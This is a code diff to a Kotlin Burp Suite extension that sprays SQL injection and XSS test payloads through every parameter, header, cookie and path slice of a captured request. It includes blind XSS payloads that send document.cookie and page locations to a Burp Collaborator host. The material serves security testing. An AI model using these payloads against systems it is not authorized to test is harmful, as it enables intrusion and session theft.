@@ -15,8 +15,7 @@ import burp.api.montoya.ui.contextmenu.AuditIssueContextMenuEvent
 import burp.api.montoya.ui.contextmenu.ContextMenuEvent
 import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider
 import burp.api.montoya.ui.contextmenu.WebSocketContextMenuEvent
-import burp.api.montoya.utilities.Base64EncodingOptions
-import com.nickcoblentz.montoya.settings.*
+import org.apache.commons.text.StringEscapeUtils
 import pathSlices
 import replacePathSlice
 import java.awt.Component
@@ -24,7 +23,6 @@ import java.awt.Font
 import java.awt.event.ActionEvent
 import java.util.concurrent.Executors
 import javax.swing.JLabel
-import javax.swing.JMenu
 import javax.swing.JMenuItem
 import javax.swing.JSeparator
 import kotlin.io.encoding.Base64
@@ -35,14 +33,14 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
     private var logger = MontoyaLogger(api, LogLevel.DEBUG)
 
 //    private val sqliQuickMenuItem = JMenuItem("SQLi SLEEP PolyGlot")
-//    private val sqliLogicPayloadsMenuItem = JMenuItem("SQLi Logic Payloads")
-//    private val sqliConcatPayloadsMenuItem = JMenuItem("SQLi Concat Payloads")
+    private val sqliLogicPayloadsMenuItem = JMenuItem("SQLi Logic Payloads")
+    private val sqliConcatPayloadsMenuItem = JMenuItem("SQLi Concat Payloads")
 //    private val sqliSingleQuoteCommentPayloadsMenuItem = JMenuItem("SQLi SingleQuoteCommentPayloads")
 //    private val sqliDoubleQuoteCommentPayloadsMenuItem = JMenuItem("SQLi DoubleQuoteCommentPayloads")
-//    private val sqliErrorPayloadsMenuItem = JMenuItem("SQLi ErrorPayloads")
+    private val sqliErrorPayloadsMenuItem = JMenuItem("SQLi ErrorPayloads")
 //    private val xssMapMenuItem = JMenuItem("XSS ASDF")
-//    private val xssPayloadsMenuItem = JMenuItem("XSS Payloads")
-//    private val blindXssImgMenuItem = JMenuItem("XSS Blind Img")
+    private val xssPayloadsMenuItem = JMenuItem("XSS Payloads")
+    private val blindXssImgMenuItem = JMenuItem("XSS Blind Img")
 //    private val xmlOutOfBandMenuItem = JMenuItem("XML OutOfBand")
 //    private val xmlFileMenuItem = JMenuItem("XML File")
 //    private val urlPathSpecialCharsMenuItem = JMenuItem("URL Path Special Chars")
@@ -64,12 +62,9 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
         },
 //        JMenu("Others").apply {
 //            add(sqliQuickMenuItem)
-//            add(sqliErrorPayloadsMenuItem)
 //            add(sqliSingleQuoteCommentPayloadsMenuItem)
 //            add(sqliDoubleQuoteCommentPayloadsMenuItem)
-//            add(sqliLogicPayloadsMenuItem)
 //            add(xssMapMenuItem)
-//            add(xssPayloadsMenuItem)
 //            add(xmlOutOfBandMenuItem)
 //            add(xmlFileMenuItem)
 //            add(urlPathSpecialCharsMenuItem)
@@ -81,21 +76,27 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 //            add(minimizeMenuItem)
 //        },
         authorizationTestsMenuItem,
-//        sqliConcatPayloadsMenuItem,
-//        blindXssImgMenuItem,
+        sqliConcatPayloadsMenuItem,
+        sqliLogicPayloadsMenuItem,
+        sqliErrorPayloadsMenuItem,
+        blindXssImgMenuItem,
+        xssPayloadsMenuItem,
         JSeparator()
     )
     private var currentHttpRequestResponseList = mutableListOf<HttpRequestResponse>()
     private val executor = Executors.newVirtualThreadPerTaskExecutor()
 
 
-    public enum class ParameterType(val value: String) {
+    enum class ParameterType(val value: String) {
         PATH_SLICE("Path Slice"),
         URL_PARAMETER("URL Parameter"),
         POST_PARAMETER("Post Parameter"),
         JSON_PARAMETER("JSON Parameter"),
         HTTP_HEADER("HTTP Header"),
         HTTP_METHOD("HTTP Method"),
+        COOKIE("Cookie"),
+        MULTI_PART("Multi Part"),
+        XML("XML"),
     }
 
 
@@ -172,15 +173,15 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 
         api.userInterface().registerContextMenuItemsProvider(this)
 //        sqliQuickMenuItem.addActionListener({ e -> sqliQuickActionPerformed(e) })
-//        sqliLogicPayloadsMenuItem.addActionListener({ e -> sqliLogicPayloadsActionPerformed(e) })
-//        sqliConcatPayloadsMenuItem.addActionListener({ e -> sqliConcatPayloadsActionPerformed(e) })
+        sqliLogicPayloadsMenuItem.addActionListener({ e -> sqliLogicPayloadsActionPerformed(e) })
+        sqliConcatPayloadsMenuItem.addActionListener({ e -> sqliConcatPayloadsActionPerformed(e) })
 //        sqliSingleQuoteCommentPayloadsMenuItem.addActionListener({ e -> sqliSingleQuoteCommentPayloadsActionPerformed(e) })
 //        sqliDoubleQuoteCommentPayloadsMenuItem.addActionListener({ e -> sqliDoubleQuoteCommentPayloadsActionPerformed(e) })
-//        sqliErrorPayloadsMenuItem.addActionListener({ e -> sqliErrorPayloadsActionPerformed(e) })
+        sqliErrorPayloadsMenuItem.addActionListener({ e -> sqliErrorPayloadsActionPerformed(e) })
 //        xssMapMenuItem.addActionListener({ e -> xssMapActionPerformed(e) })
 //        xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
-//        xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
-//        blindXssImgMenuItem.addActionListener({ e -> blindXssImgActionPerformed(e) })
+        xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
+        blindXssImgMenuItem.addActionListener({ e -> blindXssImgActionPerformed(e) })
 //        collabUrlMenuItem.addActionListener({ e -> collabUrlActionPerformed(e) })
 //        xmlOutOfBandMenuItem.addActionListener({ e -> xmlOutOfBandActionPerformed(e) })
 //        xmlFileMenuItem.addActionListener({ e -> xmlFileActionPerformed(e) })
@@ -202,6 +203,7 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
     }
 
 
+    fun getHeadersToSkip() = myExtensionSettings.ignoreHeadersSetting.split(",").map { it.trim().lowercase() }
 
     override fun provideMenuItems(event: ContextMenuEvent): MutableList<Component> {
         if(event.selectedRequestResponses().isNotEmpty())
@@ -243,7 +245,7 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 
                 val pathWordList=listOf("","#","#/",".",";",".;",";.","/;/","api","%%%%20","%20","%09","/.//./","//.","%00","%0D","%0A","static","js","img","images","ico","icons","media","static","assets","css","downloads","download","documents","docs","pdf","uploads","_next",".well-known")
                 pathWordList.forEach { prefix ->
-                    var payloads = listOf(
+                    val payloads = listOf(
                         "/$prefix/..${testCaseRequestResponse.request().path()}",
                         "//$prefix/..${testCaseRequestResponse.request().path()}",
                         "/$prefix/%2e%2e${testCaseRequestResponse.request().path()}",
@@ -275,9 +277,98 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
                 }
 
                 testCases.forEach {
-                    val response = sendRequestConsiderSettings(it)
+                    sendRequestConsiderSettings(it)
                 }
             }
+        }
+        logger.debugLog("Exit")
+    }
+
+    fun sqliConcatPayloadsActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        val category = "SQL Injection"
+        val testCaseName = "Concatenate"
+        iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,"'+'",PayloadUpdateMode.INSERT_MIDDLE)
+        iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,"'||'",PayloadUpdateMode.INSERT_MIDDLE)
+        iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,"' '",PayloadUpdateMode.INSERT_MIDDLE)
+        iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,"\"+\"",PayloadUpdateMode.INSERT_MIDDLE)
+        iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,"\"||\"",PayloadUpdateMode.INSERT_MIDDLE)
+        iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,"\" \"",PayloadUpdateMode.INSERT_MIDDLE)
+        logger.debugLog("Exit")
+    }
+
+    fun sqliLogicPayloadsActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        val category = "SQL Injection"
+        val testCaseName = "Binary Logic"
+        val payloads = listOf(
+            " or 1=1 or 1=",
+            "' or 'a'='a' or 'a'='",
+            " or 1=1 or 1=",
+            "' or 'a'='a' or 'a'='"
+        )
+
+        payloads.forEach { payload ->
+            iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,payload,PayloadUpdateMode.APPEND)
+        }
+
+        logger.debugLog("Exit")
+    }
+
+    fun sqliErrorPayloadsActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        val category = "SQL Injection"
+        val testCaseName = "Binary Logic"
+        val payloads = listOf(
+            "'\","
+        )
+
+        payloads.forEach { payload ->
+            iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,payload,PayloadUpdateMode.APPEND)
+        }
+
+        logger.debugLog("Exit")
+    }
+
+    fun blindXssImgActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        val category = "XSS"
+        val testCaseName = "Blind Image"
+        val payloads = listOf(
+            "'\"><img src=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/blindimg.png\">",
+            "'\"><iframe src='javascript:window.location=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/iframe-src?\"+btoa(parent.document.location)'></iframe>",
+            "'\"><object data='javascript:window.location=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/object-src?\"+btoa(parent.document.location)'></object>",
+            "'\"><script src=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/script-tag\"></script>",
+            "'\"><style src=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/style-tag\"></style>",
+            "'\"><img src=x onerror=\"new Image().src='https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/imgerror.png?c='+btoa(document.cookie)\">",
+            " ![](https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/blindmarkdownimg.png) "
+        )
+
+        payloads.forEach { payload ->
+                iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,payload,PayloadUpdateMode.APPEND)
+        }
+        logger.debugLog("Exit")
+    }
+
+    fun xssPayloadsActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        val category = "XSS"
+        val testCaseName = "Blind Image"
+        val payloads = listOf(
+            "'\">asdffindmeasdf",
+            "'\"><h2>heading here</h2>asdffindmeasdf",
+            "'\"><script>alert(1)</script>asdffindmeasdf",
+            "'\"＞＜script＞alert(1)＜/script＞asdffindmeasdf",
+            "\n\n## asdffindmeasdf\n\n"
+        )
+
+        payloads.forEach { payload ->
+            iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,payload,PayloadUpdateMode.APPEND)
         }
         logger.debugLog("Exit")
     }
@@ -316,7 +407,7 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 
     }
 
-    // region TODO
+// region rewrite
 //    fun maxForwardsActionPerformed(event: ActionEvent?) {
 //        logger.debugLog("Enter")
 //        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
@@ -443,27 +534,9 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 //        logger.debugLog("Exit")
 //    }
 //
-//    fun sqliLogicPayloadsActionPerformed(event: ActionEvent?) {
-//        logger.debugLog("Enter")
-//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"' or 'a'='a' or 'a'='",PayloadUpdateMode.APPEND, "SQLi boolean a'")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses," or 1=1 or 1=",PayloadUpdateMode.APPEND, "SQLi boolean 1'")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"' or 'a'='a' or 'a'='",PayloadUpdateMode.APPEND, "SQLi boolean a\"")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses," or 1=1 or 1=",PayloadUpdateMode.APPEND, "SQLi boolean 1\"")
-//        logger.debugLog("Exit")
-//    }
+
 //
-//    fun sqliConcatPayloadsActionPerformed(event: ActionEvent?) {
-//        logger.debugLog("Enter")
-//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"'+'",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat +'")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"'||'",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat ||'")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"' '",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat space'")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"+\"",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat +\"")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"||\"",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat ||\"")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"\" \"",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat space\"")
-//        logger.debugLog("Exit")
-//    }
+
 //
 //    fun sqliSingleQuoteCommentPayloadsActionPerformed(event: ActionEvent?) {
 //        logger.debugLog("Enter")
@@ -481,12 +554,7 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 //        logger.debugLog("Exit")
 //    }
 //
-//    fun sqliErrorPayloadsActionPerformed(event: ActionEvent?) {
-//        logger.debugLog("Enter")
-//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"",PayloadUpdateMode.APPEND, "SQLi '\"")
-//        logger.debugLog("Exit")
-//    }
+
 //
 //    fun xssMapActionPerformed(event: ActionEvent?) {
 //        logger.debugLog("Enter")
@@ -495,14 +563,7 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 //        logger.debugLog("Exit")
 //    }
 //
-//    fun blindXssImgActionPerformed(event: ActionEvent?) {
-//        logger.debugLog("Enter")
-//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-//        //testCases.add(labelTestCase(prefixTestCase,category,"Use Static Dir with dot dot slash", payload,"",""))
-//        iterateThroughParametersWithPayload(labelTestCase(,"'\"><img src=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/blindimg.png\">asdf",PayloadUpdateMode.APPEND, "Blind XSS Img")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"![](https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/blindmarkdownimg.png)",PayloadUpdateMode.APPEND, "Blind XSS Markdown")
-//        logger.debugLog("Exit")
-//    }
+
 //
 //    fun collabUrlActionPerformed(event: ActionEvent?) {
 //        logger.debugLog("Enter")
@@ -521,14 +582,7 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 //        logger.debugLog("Exit")
 //    }
 //
-//    fun xssPayloadsActionPerformed(event: ActionEvent?) {
-//        logger.debugLog("Enter")
-//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><h2>heading here</h2>asdfh2",PayloadUpdateMode.APPEND, "XSS h2")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><script>alert(1)</script>asdfalert",PayloadUpdateMode.APPEND, "XSS Alert")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"＞＜script＞alert(1)＜/script＞asdfutf7",PayloadUpdateMode.APPEND, "XSS UTF7")
-//        logger.debugLog("Exit")
-//    }
+
 //
 //    fun minimizeActionPerformed(event: ActionEvent?) {
 //        logger.debugLog("Enter")
@@ -590,42 +644,51 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 //        //iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"＞＜script＞alert(1)＜/script＞asdfutf7",PayloadUpdateMode.APPEND, "XSS UTF7")
 //        logger.debugLog("Exit")
 //    }
+
+//    fun responsesAreSimilar(originalResponse: HttpResponse, currentResponse : HttpResponse) : Boolean
+//    {
+//        return (originalResponse.statusCode()==currentResponse.statusCode()) &&
+//                (originalResponse.reasonPhrase()==currentResponse.reasonPhrase()) &&
+//                (originalResponse.statedMimeType()==currentResponse.statedMimeType()) &&
+//                originalResponse.body().length()>0 == currentResponse.body().length()>0
+//    }
     // endregion
 
-    fun responsesAreSimilar(originalResponse: HttpResponse, currentResponse : HttpResponse) : Boolean
-    {
-        if( (originalResponse.statusCode()==currentResponse.statusCode()) &&
-            (originalResponse.reasonPhrase()==currentResponse.reasonPhrase()) &&
-            (originalResponse.statedMimeType()==currentResponse.statedMimeType()) &&
-            originalResponse.body().length()>0 == currentResponse.body().length()>0) {
-                return true
-        }
-        return false
-    }
 
 
-    fun iterateThroughParametersWithPayload(httpRequestResponses : List<HttpRequestResponse>, payload : String, payloadType : PayloadUpdateMode, annotation : String)
+    fun iterateThroughParametersWithPayload(httpRequestResponses : List<HttpRequestResponse>, testCaseCategory: String, testCaseName: String, payload : String, payloadUpdateMode : PayloadUpdateMode)
     {
         logger.debugLog("Enter")
+
+        val skipHeaders = getHeadersToSkip()
+
         for(httpRequestResponse in httpRequestResponses)
         {
             val httpRequest = httpRequestResponse.request()
             logger.debugLog("Found request: ${httpRequest.url()}")
 
             for(header in httpRequest.headers()) {
-                logger.debugLog("Found header: ${header.name()}, ${header.value()}")
-                sendRequest(httpRequest.withUpdatedHeader(header.name(),api.utilities().urlUtils().encode(payload)),"header: ${header.name()}: $annotation")
+                val headerName = header.name()
+                val headerValue = header.value()
+                logger.debugLog("Found header: $headerName, $headerValue")
+                if(!skipHeaders.contains(headerName.lowercase())) {
+                    //sendRequest(httpRequest.withUpdatedHeader(header.name(),api.utilities().urlUtils().encode(payload)),"header: ${header.name()}: $annotation")
+                    val updatedValue = transformPayload(headerValue,payload,payloadUpdateMode)
+                    val testCase = labelTestCase(httpRequest.withUpdatedHeader(headerName,updatedValue),testCaseCategory,testCaseName,
+                        ParameterType.HTTP_HEADER.value,headerName,payload)
+                    sendRequestConsiderSettings(testCase)
+                }
             }
 
-            sendRequest(
-                httpRequest.withUpdatedHeader(
-                    "Authorization",
-                    "Basic "+api.utilities().base64Utils().encode("$payload:$payload")),
-                    "header: Authorization: Basic: $annotation")
+            sendRequestConsiderSettings(
+                labelTestCase(httpRequest.withUpdatedHeader("Authorization","Basic "+api.utilities().base64Utils().encode("$payload:$payload")),
+                    testCaseCategory,testCaseName, ParameterType.HTTP_HEADER.value,"Authorization Basic",payload)
+            )
 
-            for(pathSlice in httpRequest.pathSlices()) {
-                logger.debugLog("Found path slice: ${pathSlice.value}")
-                sendRequest(httpRequest.replacePathSlice(pathSlice,api.utilities().urlUtils().encode(payload)),"pathSlice: ${pathSlice.value}: $annotation")
+            replaceAllPathSlicesAndLabel(httpRequest,testCaseCategory,testCaseName) { slice ->
+                api.utilities().urlUtils().encode(transformPayload(api.utilities().urlUtils().decode(slice.value),payload,payloadUpdateMode))
+            }.forEach { request ->
+                sendRequestConsiderSettings(request)
             }
 
             for(parameter in httpRequest.parameters())
@@ -636,44 +699,66 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 
                 if(myExtensionSettings.ignoreParametersSetting.isBlank() || !myExtensionSettings.ignoreParametersSetting.toRegex(RegexOption.IGNORE_CASE).matches(parameter.name())) {
                     when (parameter.type()) {
-                        HttpParameterType.URL ->
-                            sendRequest(
-                                httpRequest.withUpdatedParameters(
-                                    createUpdatedParameter(
-                                        parameter,
-                                        api.utilities().urlUtils().encode(payload),
-                                        payloadType
-                                    )
-                                ), "URL Param: ${parameter.name()}: $annotation"
-                            )
+                        HttpParameterType.URL -> {
+                            val paramName = parameter.name()
+                            val testCase = labelTestCase(httpRequest.withUpdatedParameters(
+                                createUpdatedParameter(
+                                    parameter,
+                                    payload,
+                                    payloadUpdateMode
+                                )
+                            ), testCaseCategory,testCaseName, ParameterType.URL_PARAMETER.value,paramName,payload)
+                            sendRequestConsiderSettings(testCase)
+
+                            val testCase2 = labelTestCase(httpRequest.withUpdatedParameters(
+                                createUpdatedParameter(
+                                    parameter,
+                                    payload,
+                                    payloadUpdateMode,
+                                    false
+                                )
+                            ), testCaseCategory,testCaseName, ParameterType.URL_PARAMETER.value,paramName,payload)
+                            sendRequestConsiderSettings(testCase2)
+                        }
 
                         HttpParameterType.BODY ->
-                            sendRequest(
-                                httpRequest.withUpdatedParameters(
-                                    createUpdatedParameter(
-                                        parameter,
-                                        api.utilities().urlUtils().encode(payload),
-                                        payloadType
-                                    )
-                                ), "Body Param: ${parameter.name()}: $annotation"
-                            )
+                        {
+                            val paramName = parameter.name()
+                            val testCase = labelTestCase(httpRequest.withUpdatedParameters(
+                                createUpdatedParameter(
+                                    parameter,
+                                    payload,
+                                    payloadUpdateMode
+                                )
+                            ), testCaseCategory,testCaseName, ParameterType.POST_PARAMETER.value,paramName,payload)
+                            sendRequestConsiderSettings(testCase)
+                        }
 
                         HttpParameterType.COOKIE ->
-                            sendRequest(
-                                httpRequest.withUpdatedParameters(
-                                    createUpdatedParameter(
-                                        parameter,
-                                        api.utilities().urlUtils().encode(payload),
-                                        payloadType
-                                    )
-                                ), "Cookie: ${parameter.name()}: $annotation"
-                            )
+                        {
+                            val paramName = parameter.name()
+                            val testCase = labelTestCase(httpRequest.withUpdatedParameters(
+                                createUpdatedParameter(
+                                    parameter,
+                                    payload,
+                                    payloadUpdateMode
+                                )
+                            ), testCaseCategory,testCaseName, ParameterType.COOKIE.value,paramName,payload)
+                            sendRequestConsiderSettings(testCase)
+                        }
 
                         HttpParameterType.MULTIPART_ATTRIBUTE ->
-                            sendRequest(
-                                httpRequest.withUpdatedParameters(createUpdatedParameter(parameter, payload,payloadType)),
-                                "mutipart Param: ${parameter.name()}: $annotation"
-                            )
+                        {
+                            val paramName = parameter.name()
+                            val testCase = labelTestCase(httpRequest.withUpdatedParameters(
+                                createUpdatedParameter(
+                                    parameter,
+                                    payload,
+                                    payloadUpdateMode
+                                )
+                            ), testCaseCategory,testCaseName, ParameterType.MULTI_PART.value,paramName,payload)
+                            sendRequestConsiderSettings(testCase)
+                        }
 
                         HttpParameterType.JSON -> {
                             /*api.logging().logToOutput("Name: ${parameter.name()}")
@@ -689,51 +774,34 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
                             api.logging().logToOutput("Prepend Test: ${httpRequest.toString().substring(0,parameter.valueOffsets().startIndexInclusive())}PREPEND!!!${httpRequest.toString().substring(parameter.valueOffsets().startIndexInclusive())}")
                             api.logging().logToOutput("Append Test: ${httpRequest.toString().substring(0,parameter.valueOffsets().endIndexExclusive())}APPEND!!!${httpRequest.toString().substring(parameter.valueOffsets().endIndexExclusive())}")
                             api.logging().logToOutput("Replace Test: ${httpRequest.toString().substring(0,parameter.valueOffsets().startIndexInclusive())}REPLACE!!!${httpRequest.toString().substring(parameter.valueOffsets().endIndexExclusive())}")*/
-                            
-                            sendRequest(
-                                httpRequest.withUpdatedParsedParameterValue(
-                                    parameter,
-                                    payload.replace("\"", "\\\""),
-                                    payloadType
-                                ), "URL JSON: ${parameter.name()}: $annotation"
-                            )
+                            val testCase = labelTestCase(insertPayloadIntoUnsupportedParameterType(httpRequest,parameter,payload,payloadUpdateMode),
+                                testCaseCategory,testCaseName, ParameterType.JSON_PARAMETER.value,parameter.name(),payload)
+                            sendRequestConsiderSettings(testCase)
                         }
 
-                        HttpParameterType.XML -> {
-                            sendRequest(
-                                httpRequest.withUpdatedParsedParameterValue(
-                                    parameter,
-                                    api.utilities().htmlUtils().encode(payload),
-                                    payloadType
-                                ), "URL XML: ${parameter.name()}: $annotation"
-                            )
-                            sendRequest(
-                                httpRequest.withUpdatedParsedParameterValue(
-                                    parameter,
-                                    payload,
-                                    payloadType
-                                ), "URL XML: ${parameter.name()}: $annotation"
-                            )
-                            //at some point, change this from hardcoded replace to something else
-                            sendRequest(
-                                httpRequest.withUpdatedParsedParameterValue(parameter, "<![CDATA[$payload]]>",PayloadUpdateMode.REPLACE),
-                                "URL XML: ${parameter.name()}: $annotation"
-                            )
-                            sendRequest(
-                                httpRequest.withUpdatedParsedParameterValue(parameter, payload,PayloadUpdateMode.REPLACE),
-                                "URL XML: ${parameter.name()}: $annotation"
-                            )
+                        HttpParameterType.XML,HttpParameterType.XML_ATTRIBUTE -> {
+                            val testCase = labelTestCase(insertPayloadIntoUnsupportedParameterType(httpRequest,parameter,payload,payloadUpdateMode),
+                                testCaseCategory,testCaseName, ParameterType.XML.value,parameter.name(),payload)
+                            sendRequestConsiderSettings(testCase)
+
+                            val testCase2 = labelTestCase(insertPayloadIntoUnsupportedParameterType(httpRequest,parameter,payload,payloadUpdateMode,false),
+                                testCaseCategory,testCaseName, ParameterType.XML.value,parameter.name(),payload)
+                            sendRequestConsiderSettings(testCase2)
+
+                            val testCase3 = labelTestCase(insertPayloadIntoUnsupportedParameterType(httpRequest,parameter,"<![CDATA[$payload]]>",payloadUpdateMode,false),
+                                testCaseCategory,testCaseName, ParameterType.XML.value,parameter.name(),"<![CDATA[$payload]]>")
+                            sendRequestConsiderSettings(testCase3)
+
+                            if(payloadUpdateMode!=PayloadUpdateMode.REPLACE) {
+                                val testCase4 = labelTestCase(insertPayloadIntoUnsupportedParameterType(httpRequest,parameter,payload,payloadUpdateMode),
+                                    testCaseCategory,testCaseName, ParameterType.XML.value,parameter.name(),payload)
+                                sendRequestConsiderSettings(testCase4)
+
+                                val testCase5 = labelTestCase(insertPayloadIntoUnsupportedParameterType(httpRequest,parameter,payload,payloadUpdateMode,false),
+                                    testCaseCategory,testCaseName, ParameterType.XML.value,parameter.name(),payload)
+                                sendRequestConsiderSettings(testCase5)
+                            }
                         }
-
-                        HttpParameterType.XML_ATTRIBUTE ->
-                            sendRequest(
-                                    httpRequest.withUpdatedParsedParameterValue(
-                                    parameter,
-                                    api.utilities().htmlUtils().encode(payload),
-                                    payloadType
-                                ), "URL XML Attr: ${parameter.name()}: $annotation"
-                            )
-
                         else -> Unit
                     }
                 }
@@ -745,47 +813,138 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
         logger.debugLog("Exit")
     }
 
-    fun createUpdatedParameter(parsedParameter : ParsedHttpParameter,encodedPayload : String,payloadType : PayloadUpdateMode) : HttpParameter {
+    fun createUpdatedParameter(parsedParameter : ParsedHttpParameter, payload : String, payloadUpdateMode : PayloadUpdateMode, encodePayload: Boolean = true) : HttpParameter {
         logger.debugLog("Enter")
-        return HttpParameter.parameter(parsedParameter.name(), insertPayloadAccordingToType(parsedParameter,encodedPayload,payloadType), parsedParameter.type())
+        val paramName = parsedParameter.name()
+        val typesRequiringURLEncoding = listOf(HttpParameterType.URL.name,HttpParameterType.BODY.name)
+        val paramValue = if(typesRequiringURLEncoding.contains(parsedParameter.type().name)) {
+            api.utilities().urlUtils().decode(parsedParameter.value())
+        }
+        else {
+            parsedParameter.value()
+        }
+        val transformedPayload = transformPayload(paramValue,payload,payloadUpdateMode)
+
+        val encodedTransformedPayload = if(encodePayload) {
+            if(typesRequiringURLEncoding.contains(parsedParameter.type().name)) {
+                api.utilities().urlUtils().encode(transformedPayload)
+            }
+            else {
+                transformedPayload
+            }
+        }
+        else {
+            transformedPayload
+        }
+
+        return HttpParameter.parameter(paramName, encodedTransformedPayload, parsedParameter.type())
     }
 
-    fun insertPayloadAccordingToType(parsedParameter : ParsedHttpParameter,encodedPayload : String,payloadType : PayloadUpdateMode) : String {
-        when (payloadType) {
-            PayloadUpdateMode.PREPEND -> return encodedPayload + parsedParameter.value()
+
+
+
+//    fun insertPayloadAccordingToType(parsedParameter : ParsedHttpParameter,encodedPayload : String,payloadType : PayloadUpdateMode) : String {
+//        when (payloadType) {
+//            PayloadUpdateMode.PREPEND -> return encodedPayload + parsedParameter.value()
+//            PayloadUpdateMode.INSERT_MIDDLE -> {
+//                val parsedParamValLength = parsedParameter.value().length
+//                if (parsedParamValLength > 1) {
+//                    return parsedParameter.value()
+//                        .substring(0, parsedParamValLength / 2) + encodedPayload + parsedParameter.value()
+//                        .substring(parsedParamValLength / 2 + 1)
+//                }
+//                return encodedPayload + parsedParameter.value()
+//            }
+//
+//            PayloadUpdateMode.APPEND -> return parsedParameter.value() + encodedPayload
+//            else -> return encodedPayload
+//        }
+//    }
+
+    fun transformPayload(originalValue: String, payload: String, payloadMode : PayloadUpdateMode): String {
+        when (payloadMode) {
+            PayloadUpdateMode.PREPEND -> return payload + originalValue
             PayloadUpdateMode.INSERT_MIDDLE -> {
-                val parsedParamValLength = parsedParameter.value().length
-                if (parsedParamValLength > 1) {
-                    return parsedParameter.value()
-                        .substring(0, parsedParamValLength / 2) + encodedPayload + parsedParameter.value()
-                        .substring(parsedParamValLength / 2 + 1)
+                val originalValLength = originalValue.length
+                if (originalValLength > 1) {
+                    return originalValue
+                        .substring(0, originalValLength / 2) + payload + originalValue
+                        .substring(originalValLength / 2 + 1)
                 }
-                return encodedPayload + parsedParameter.value()
+                return payload + originalValue
             }
 
-            PayloadUpdateMode.APPEND -> return parsedParameter.value() + encodedPayload
-            else -> return encodedPayload
+            PayloadUpdateMode.APPEND -> return originalValue + payload
+            else -> return payload
         }
+    }
+
+    fun insertPayloadIntoUnsupportedParameterType(request : HttpRequest, parsedParameter : ParsedHttpParameter, payload: String, payloadUpdateMode : PayloadUpdateMode = PayloadUpdateMode.REPLACE, encodePayload : Boolean = true) : HttpRequest {
+        val updatedParsedParam = request.parameters().find { it.name()==parsedParameter.name() && it.type() == parsedParameter.type() && it.value()==parsedParameter.value() }
+
+
+
